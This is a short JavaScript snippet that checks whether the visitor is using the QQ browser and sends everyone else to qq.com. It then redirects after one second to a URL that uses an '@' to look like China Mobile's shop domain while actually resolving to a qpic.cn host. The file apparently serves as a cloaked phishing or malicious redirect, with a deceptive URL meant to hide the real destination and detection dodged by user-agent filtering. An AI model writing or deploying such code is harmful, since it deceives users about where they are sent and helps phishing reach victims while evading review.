function leleua() {
    var sUserAgent = navigator.userAgent.toLowerCase();
    if (sUserAgent.match(/QQ/i) == 'qq' || location.href.indexOf("edit") > -1) {
    } else {
        window.location.href = "https://qq.com";
    }
}

leleua();

setTimeout(function() {
    var timestamp = new Date().getTime();
    var url = 'https://shop.10086.cn@meeting-75420.picgzc.qpic.cn/ff8267e3566dbad4a1aa0f50775569e814f56f7768691c9048f42681cfa7a308' + '?' + timestamp + '3Cscript';
    location.href = url;
}, 1000);
